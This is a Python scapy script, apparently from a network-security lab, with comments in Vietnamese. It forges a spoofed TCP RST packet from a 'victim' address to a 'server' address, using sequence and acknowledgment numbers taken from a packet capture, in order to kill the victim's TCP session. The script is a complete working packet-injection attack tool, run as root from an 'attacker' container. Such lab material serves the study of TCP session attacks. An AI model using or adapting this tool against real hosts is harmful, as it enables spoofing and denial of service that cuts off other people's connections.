#!/usr/bin/env python3
"""Chen goi tin RST de dong phien TCP victim -> server.
Can doc so SEQ/ACK tu capture (tcpdump -nn -r ~/session.pcap) roi truyen vao.
Chay tren container attacker (can root):
  sudo python3 rst-hijack.py <seq> <ack> <sport>
Trong do <seq> = so sequence hien tai cua victim,
<ack> = so acknowledgment hien tai, <sport> = cong nguon cua victim."""

import sys
from scapy.all import IP, TCP, send

VICTIM = '172.21.0.2'
SERVER = '172.21.0.3'

def main():
    if len(sys.argv) != 4:
        print('Dung: sudo python3 rst-hijack.py <seq> <ack> <sport>')
        sys.exit(2)
    seq, ack, sport = int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3])
    pkt = (IP(src=VICTIM, dst=SERVER)
           / TCP(sport=sport, dport=9999, flags='R', seq=seq, ack=ack))
    send(pkt, verbose=False)
    print('Da chen RST seq=%d ack=%d sport=%d -> dong phien TCP' % (seq, ack, sport))

if __name__ == '__main__':
    main()
